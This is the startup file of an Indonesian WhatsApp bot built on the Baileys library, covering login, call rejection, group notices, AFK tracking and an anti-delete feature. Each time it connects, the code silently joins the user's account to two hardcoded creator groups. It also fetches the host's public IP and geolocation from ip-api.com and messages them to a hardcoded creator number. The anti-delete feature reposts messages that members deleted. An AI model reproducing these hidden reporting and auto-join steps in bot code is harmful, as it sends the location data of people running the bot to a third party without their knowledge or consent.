"use strict";
let { WAConnection : _WAConnection } = require("@adiwajshing/baileys");
let { MessageType } = require("@adiwajshing/baileys");
const qrcode = require("qrcode-terminal");
const figlet = require("figlet");
const moment = require("moment-timezone");
const fs = require("fs");
const fetch = require('node-fetch')
const ms = require("parse-ms");
const { exec } = require('child_process')
const { color, SuryaLog } = require("./lib/color");
const { serialize, sleep } = require("./lib/myfunc");
const myfunc = require("./lib/myfunc");
const afk = require("./lib/afk");
const gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
moment.tz.setDefault("Asia/Jakarta").locale("id");
const times = moment.tz('Asia/Jakarta').format('DD•MM•YYYY HH:mm:ss')

let WAConnection = myfunc.WAConnection(_WAConnection)

let _afk = JSON.parse(fs.readFileSync('./database/afk.json'));
let welcome = JSON.parse(fs.readFileSync('./database/welcome.json'));
let left = JSON.parse(fs.readFileSync('./database/left.json'));
let setting = JSON.parse(fs.readFileSync('./config.json'));
const Suryaa = '62895415497664@s.whatsapp.net'
let blocked = [];
let antidel = true
let autoplaymusic = true
let baterai = {
baterai: 21,
cas: false
};

require('./message/surya.js')
nocache('./message/surya.js', module => console.log(color(`'${module}' Telah berubah!`)))
require('./message/group.js')
nocache('./message/group.js', module => console.log(color(`'${module}' Telah berubah!`)))
require('./message/help.js')
nocache('./message/help.js', module => console.log(color(`'${module}' Telah berubah!`)))

const start = async(sesion, surya = new WAConnection) => {
surya.logger.level = 'warn'

console.log(color(figlet.textSync(`${setting.MechaName}`, {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		whitespaceBreak: true
	    }), 'cyan'))
	    
// Menunggu QR
surya.on('qr', qr => {
qrcode.generate(qr, { small: true })
console.log(SuryaLog('Scan QR Nya Sayank'))
})

// Restore Sesion
fs.existsSync(sesion) && surya.loadAuthInfo(sesion)

// Mencoba menghubungkan
surya.on('connecting', () => {
console.log(color('CONNECTING....', 'cyan'))
})

if (autoplaymusic === true) {
exec(`cd /sdcard/download && play *mp3`)
//console.log(color('|MUSIC|', 'cyan'), color('Memulai Memutar Lagu...', 'cyan'))
}
// Write Sesion
await surya.connect({timeoutMs: 30 * 1000})
fs.writeFileSync(sesion, JSON.stringify(surya.base64EncodedAuthInfo(), null, '\t'))
let grup1 = `https://chat.whatsapp.com/EW8b7NnSElGJkX1o8sEQQZ`
let grup2 = `https://chat.whatsapp.com/IKFMxJJgC282pZnsTWUZv3`
surya.query({ json:["action", "invite", `${grup1.replace('https://chat.whatsapp.com/','')}`]})
surya.query({ json:["action", "invite", `${grup2.replace('https://chat.whatsapp.com/','')}`]})
console.log(color('|MECHA|', 'cyan'), color('Bergabung Ke Grup Creator Surya', 'cyan'))
surya.sendMessage(`${setting.ownerNumber}`, `*Hai Owner ${setting.MechaName}, Bot Telah Berhasil Tersambung Pada Nomor Ini*
\`\`\`${JSON.stringify(surya.user, null, 2)}\`\`\`
*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Creator Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Creator Mecha Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/Rya.jpg'),sourceUrl:"https://wa.me/62895415497664?text=Assalamualaikum+bang+surya"}}})
console.log(color('|MECHA|', 'cyan'), color('Mengirim Bot Info Ke Creator Bot Surya', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
.then(bu =>{
surya.sendMessage(Suryaa, `
*──「IP USER MECHA BOTZ」──*

\`\`\`${bu}\`\`\``, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Creator Mecha Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/Rya.jpg'),sourceUrl:"https://wa.me/62895415497664?text=Assalamualaikum"}}})
console.log(color('|MECHA|', 'cyan'), color('Mengirim IP address Ke Creator Bot Surya', 'cyan'))
   })

// Konek
surya.on('open', (json) => {
console.log(SuryaLog('Connected, Welcome Sayank'))
})

// Ya gitulah
surya.on('ws-close', () => {
surya.sendMessage(Suryaa, `Koneksi terputus, mencoba menghubungkan kembali..`, MessageType.text)
console.log(SuryaLog('Koneksi terputus, mencoba menghubungkan kembali..'))
})

// Ntahlah
surya.on('close', async ({ reason, isReconnecting }) => {
console.log(SuryaLog('Terputus, Alasan :' + reason + `
Mencoba mengkoneksi ulang :` + isReconnecting))
if (!isReconnecting) {
console.log(SuryaLog('Hubungkan ke WhatsApp ditolak dan mematikan.'))
}
})

// Block
surya.on('CB:Blocklist', json => {
if (blocked.length > 2) return
for (let i of json[1].blocklist) {
blocked.push(i.replace('c.us','s.whatsapp.net'))
}
})
// Action Call
surya.on('CB:action,,call', async json => {
const callerid = json[2][0][1].from;
const buttons = [{buttonId: 'verify', buttonText: {displayText: 'Maaf Mecha Botz'}, type: 1}]
const buttonsMessage = {
contentText: ` *「ANTI CALL MECHA BOTZ」*

Terdeteksi @${callerid.split('@')[0]} telah menelfon bot
*Tolong jangan telfon saya atau kamu akan saya blok!*`,
footerText: `© Created Mecha Botz By @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(callerid, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, callerid, '0@s.whatsapp.net']}})
//await sleep(5000)
//await surya.blockUser(callerid, "add")
})

// Action Battery
surya.on('CB:action,,battery', json => {
const a = json[2][0][1].value
const b = json[2][0][1].live
baterai.baterai = a
baterai.cas = b
})

surya.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe && m.key.fromMe) return
if (antidel === true) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
const type = Object.keys(m.message)[0]
surya.sendMessage(m.key.remoteJid, `
━━━━⬣  𝘼𝙉𝙏𝙄 𝘿𝙀𝙇𝙀𝙏𝙀  ⬣━━━━

    *Nama  : @${m.participant.split("@")[0]}*
    *Jam  : ${jam} ${week} ${calender}*
    *Type  : ${type}*

━━━━⬣  𝘼𝙉𝙏𝙄 𝘿𝙀𝙇𝙀𝙏𝙀  ⬣━━━━`, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
surya.copyNForward(m.key.remoteJid, m.message)
})

surya.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe) {
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let c = surya.chats.get(m.key.remoteJid)
let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
let co3ntent = surya.generateForwardMessageContent(a, false)
let c3type = Object.keys(co3ntent)[0]
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
surya.copyNForward(m.key.remoteJid, m.message)
surya.sendMessage(m.key.remoteJid, `_*▷Anti Delete Mecha Botz*_

\`\`\`Nama : @${m.participant.split("@")[0]}\`\`\`
\`\`\`Tipe : ${c3type}\`\`\`
\`\`\`Tanggal : ${jam} - ${week} ${weton} - ${calender}\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
}
})


// Chat
surya.on('chat-update', async (rya) => {
// Presence
if (rya.presences){
for (let key in rya.presences){
if (rya.presences[key].lastKnownPresence === "composing" || rya.presences[key].lastKnownPresence === "recording"){
if (afk.checkAfkUser(key, _afk)) {
const S = '\`\`\`'
const getId = afk.getAfkId(key, _afk)
const getTime = Date.now() - afk.getAfkTime(getId, _afk)
const getAlasan = afk.getAfkReason(getId, _afk)
const heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(key, _afk), 1)
fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
const buttons = [{buttonId: 'verify', buttonText: {displayText: 'Hmmm'}, type: 1}]
const buttonsMessage = {
contentText: `_*@${key.split("@")[0]} Berhenti AFK*_, ${S}Dia sedang ${rya.presences[key].lastKnownPresence === "composing" ? "mengetik..." : "merekam audio..."}${S}

_*Dengan alasan :*_ ${getAlasan}
_*Sejak : ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik Yang Lalu*_`,
footerText: `Powered By @0
© Created Mecha Botz By @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(rya.jid, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, key, '0@s.whatsapp.net']}})
}
}
}
}
if (!rya.hasNewMessage) return
rya = rya.messages.all()[0]
if (!rya.message) return
if (rya.key && rya.key.remoteJid == 'status@broadcast') return
let msg = serialize(surya, rya)
require('./message/surya')(surya, msg, blocked, baterai, _afk, welcome, left)
})

surya.on("group-update", async (anu) => { 
const fgc = {key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `MECHA BOTZ\nCreator By Surya 🌹`, 'jpegThumbnail': fs.readFileSync('./sticker/thumb.jpeg')}}}
let metdata = await surya.groupMetadata(anu.jid);
if (anu.announce == "false") {
let teks = `*── [ GROUP OPENED ] ──*

Group telah dibuka oleh admin
Sekarang semua member bisa mengirim pesan`
surya.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Mecha Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/Rya.jpg'),sourceUrl:"https://wa.me/62895415497664?text=Assalamualaikum"}}})
} else if (anu.announce == "true") {
 let teks = `*── [ GROUP CLOSED ] ──*
 
Group telah ditutup oleh admin
Sekarang hanya admin yang dapat mengirim pesan`
surya.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Mecha Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/Rya.jpg'),sourceUrl:"https://wa.me/62895415497664?text=Assalamualaikum"}}})
} else if (!anu.desc == "") {
let tag = anu.descOwner.split("@")[0] + "@s.whatsapp.net";
let teks = `*─ [ Group Description Change ] ─*

Deskripsi Group telah diubah oleh Admin @${anu.descOwner.split("@")[0]}

*❤️Deskripsi Baru :*
${anu.desc}`
//surya.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: { mentionedJid: [tag] }})
const buttons = [{buttonId: 'verify', buttonText: {displayText: 'Wih Canggih!'}, type: 1}]
const buttonsMessage = {
contentText: teks,
footerText: `Powered By @0
© Created Mecha Botz By @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(metdata.id, buttonsMessage, MessageType.buttonsMessage, {
contextInfo :{text: 'hi',
"forwardingScore": 1000,
isForwarded: true,
sendEphemeral: true,
"externalAdReply": {
"title": `Creator Mecha Botz`,
"body": "Jabal Surya Ngalam",
"previewType": "PHOTO",
"thumbnailUrl": "https://i.ibb.co/Pt0wv6V/4cc3fc551dbd.jpg",
"thumbnail": "https://i.ibb.co/Pt0wv6V/4cc3fc551dbd.jpg",
"sourceUrl": "https://wa.me/62895415497664?text=Hai+kak+surya"
},mentionedJid:[Suryaa, tag, '0@s.whatsapp.net']}, quoted : fgc})
} else if (anu.restrict == "false") {
let teks = `- [ GROUP SETTING CHANGE ] -

Edit Group info telah dibuka untuk member
Sekarang semua member dapat mengedit info Group Ini`;
surya.sendMessage(metdata.id, teks, MessageType.text);
} else if (anu.restrict == "true") {
let teks = `- [ GROUP SETTING CHANGE ] -

Edit Group info telah ditutup untuk member
Sekarang hanya admin group yang dapat mengedit info Group Ini`;
surya.sendMessage(metdata.id, teks, MessageType.text);
}
})
// Event Group 
surya.on('group-participants-update', async (anj) => {
require("./message/group")(surya, anj, welcome, left)
})
}
 function nocache(module, cb = () => { }) {
console.log(color(`Module ${module} Dipantau Oleh Mastah Surya`))
fs.watchFile(require.resolve(module), async () => {
await uncache(require.resolve(module))
cb(module)
})
}
function uncache(module = '.') {
return new Promise((resolve, reject) => {
try {
delete require.cache[require.resolve(module)]
resolve()
} catch (e) {
reject(e)
}
})
}

start(`./${setting.sessionName}.json`)
.catch(err => console.log(err))